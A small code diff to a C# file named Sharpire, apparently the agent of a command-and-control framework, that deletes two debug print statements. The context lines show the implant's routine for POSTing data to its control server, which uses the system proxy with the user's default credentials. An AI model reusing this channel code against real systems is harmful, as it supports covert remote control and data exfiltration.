@@ -382,9 +382,7 @@ namespace Sharpire
                 webClient.Headers.Add("User-Agent", sessionInfo.GetStagerUserAgent());
                 webClient.Proxy = WebRequest.GetSystemWebProxy();
                 webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
-                Console.WriteLine("the error is here!!!");      // !!!
                 response = webClient.UploadData(sessionInfo.GetControlServers().First() + uri, "POST", data);
-                Console.WriteLine("test 3");                    // !!!
             }
 
             return response;
